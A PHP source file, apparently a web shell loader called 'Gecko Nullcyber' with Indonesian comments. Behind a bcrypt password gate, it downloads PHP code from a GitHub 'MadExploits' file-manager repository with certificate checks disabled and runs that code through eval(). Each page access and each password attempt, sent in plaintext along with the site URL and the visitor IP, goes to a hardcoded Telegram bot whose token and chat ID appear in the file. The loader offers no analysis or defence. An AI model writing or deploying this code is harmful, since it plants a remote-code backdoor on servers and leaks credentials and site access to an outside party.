<?php
declare(strict_types=1);

/* ================= KONFIGURASI ================= */

// Password login (bcrypt). Default: gecko123
// Buat hash baru: php -r "echo password_hash('passbaru', PASSWORD_BCRYPT, ['cost'=>12]);"
const NC_PASS_HASH    = '$2y$10$T3WWC0/w10UtD5BJuuTy9eOLNMrckcb6xYOe3UkwWKAuYLqp8AJSS';
const NC_TG_ENABLED   = true;
const NC_TG_BOT_TOKEN = '8055884841:AAHNymaFqhfIBp7vYw4lkHLncykvHpOBZjM';
const NC_TG_CHAT_ID   = '1883446251';
const NC_APP_NAME     = 'Gecko Nullcyber';

/* ================= END KONFIGURASI ================= */

session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'httponly' => true,
    'samesite' => 'Lax',
    'secure'   => !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
]);
session_name('nc_sess');

$nc_started  = false;
$nc_sessionPaths = [
    rtrim((string) ini_get('session.save_path'), '/\\'),
    rtrim(sys_get_temp_dir(), '/\\') . '/nc_sess_' . substr(md5(__DIR__), 0, 8),
    __DIR__ . '/.nc_sess',
];
foreach (array_unique($nc_sessionPaths) as $nc_path) {
    if ($nc_path === '') {
        continue;
    }
    if (!is_dir($nc_path)) {
        @mkdir($nc_path, 0700, true);
    }
    if (!is_dir($nc_path) || !is_writable($nc_path)) {
        continue;
    }
    ini_set('session.save_path', $nc_path);
    if (@session_start()) {
        $nc_started = true;
        break;
    }
}
if (!$nc_started && @session_start()) {
    $nc_started = true;
}
unset($nc_path, $nc_sessionPaths);
if (!isset($_SESSION)) {
    $_SESSION = [];
}
$nc_noSession = !$nc_started;

function nc_ip(): string
{
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = trim(explode(',', (string) $_SERVER[$key])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP) !== false) {
                return $ip;
            }
        }
    }
    return (string) ($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
}

function nc_url(): string
{
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host   = (string) ($_SERVER['HTTP_HOST'] ?? 'localhost');
    $uri    = (string) ($_SERVER['REQUEST_URI'] ?? '/');
    return $scheme . '://' . $host . $uri;
}

function nc_telegram(string $pass, string $status): void
{
    if (!NC_TG_ENABLED || NC_TG_BOT_TOKEN === '' || NC_TG_CHAT_ID === '' || strncmp(NC_TG_BOT_TOKEN, 'ISI_', 4) === 0) {
        return;
    }

    $line = str_repeat('=', 20);
    $text = '====' . NC_APP_NAME . '====' . "\n"
        . 'URL=' . nc_url() . "\n"
        . 'pass=' . $pass . "\n"
        . 'status=' . $status . "\n"
        . 'IP=' . nc_ip() . "\n"
        . $line;

    $ch = curl_init('https://api.telegram.org/bot' . NC_TG_BOT_TOKEN . '/sendMessage');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query([
            'chat_id'                  => NC_TG_CHAT_ID,
            'text'                     => $text,
            'disable_web_page_preview' => 'true',
        ]),
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

if (isset($_GET['logout'])) {
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', [
            'expires'  => time() - 42000,
            'path'     => $p['path'],
            'domain'   => $p['domain'],
            'secure'   => $p['secure'],
            'httponly' => $p['httponly'],
            'samesite' => 'Lax',
        ]);
    }
    session_destroy();
    header('Location: ' . strtok(nc_url(), '?'), true, 303);
    exit;
}

if (empty($_SESSION['nc_auth'])) {
    $error = '';

    if (($_SERVER['REQUEST_METHOD'] ?? 'GET') === 'POST') {
        $sent = (string) ($_POST['pass'] ?? '');
        $pass = str_replace(["\r", "\n"], '', $sent);

        if (empty($_SESSION['nc_csrf']) || !hash_equals((string) $_SESSION['nc_csrf'], (string) ($_POST['csrf'] ?? ''))) {
            $error = 'Sesi kedaluwarsa, coba lagi.';
        } elseif (password_verify($sent, NC_PASS_HASH)) {
            nc_telegram($pass, 'valid');
            session_regenerate_id(true);
            $_SESSION['nc_auth'] = true;
            header('Location: ' . nc_url(), true, 303);
            exit;
        } else {
            nc_telegram($pass, 'failed');
            $error = 'Password salah.';
        }
    } else {
        nc_telegram('-', 'access');
    }

    if (empty($_SESSION['nc_csrf'])) {
        $_SESSION['nc_csrf'] = bin2hex(random_bytes(16));
    }
    $csrf = (string) $_SESSION['nc_csrf'];
    ?>
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Login - <?= htmlspecialchars(NC_APP_NAME) ?></title>
<style>
    :root { color-scheme: dark; }
    * { box-sizing: border-box; }
    body {
        margin: 0; min-height: 100vh; display: grid; place-items: center;
        background: #0d1117; color: #e6edf3;
        font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
    }
    form {
        width: min(360px, 92vw); padding: 28px;
        background: #161b22; border: 1px solid #30363d; border-radius: 12px;
        box-shadow: 0 12px 40px rgba(0,0,0,.45);
    }
    h1 { margin: 0 0 6px; font-size: 18px; letter-spacing: .3px; }
    p.sub { margin: 0 0 20px; font-size: 12px; color: #8b949e; }
    input {
        width: 100%; padding: 11px 12px; font-size: 15px;
        background: #0d1117; color: inherit; border: 1px solid #30363d; border-radius: 8px;
    }
    input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,.25); }
    button {
        width: 100%; margin-top: 14px; padding: 11px; cursor: pointer;
        font-size: 14px; font-weight: 600; color: #fff;
        background: #2563eb; border: 0; border-radius: 8px;
    }
    button:hover { background: #1d4ed8; }
    .err {
        margin: 0 0 14px; padding: 8px 10px; font-size: 12px;
        color: #fecaca; background: rgba(248,113,113,.12);
        border: 1px solid rgba(248,113,113,.35); border-radius: 8px;
    }
</style>
</head>
<body>
<form method="post" autocomplete="off">
    <h1><?= htmlspecialchars(NC_APP_NAME) ?></h1>
    <p class="sub">Masukkan password untuk melanjutkan.</p>
    <?php if (!empty($nc_noSession)): ?>
        <div class="err">Session PHP gagal dimulai di hosting ini.</div>
    <?php endif; ?>
    <?php if ($error !== ''): ?>
        <div class="err"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>
    <input type="hidden" name="csrf" value="<?= htmlspecialchars($csrf) ?>">
    <input type="password" name="pass" placeholder="Password" required autofocus autocomplete="current-password">
    <button type="submit">Masuk</button>
</form>
</body>
</html>
    <?php
    exit;
}

function tap($v, $f) {
    $f($v);
    return $v;
}

// Fetch remote PHP code
$ch = curl_init('https://raw.githubusercontent.com/MadExploits/GECKO-FILE-MANAGER/refs/heads/main/fm_geckov2.php');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_USERAGENT      => 'Mozilla/5.0',
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
]);
$code = curl_exec($ch);
curl_close($ch);

// Eval remote PHP code
$code = ltrim((string) $code);
if (strncasecmp($code, '<?php', 5) === 0) {
    $code = substr($code, 5);
} elseif (strncmp($code, '<?=', 3) === 0) {
    $code = 'echo ' . substr($code, 3);
} elseif (strncmp($code, '<?', 2) === 0) {
    $code = substr($code, 2);
}
eval($code);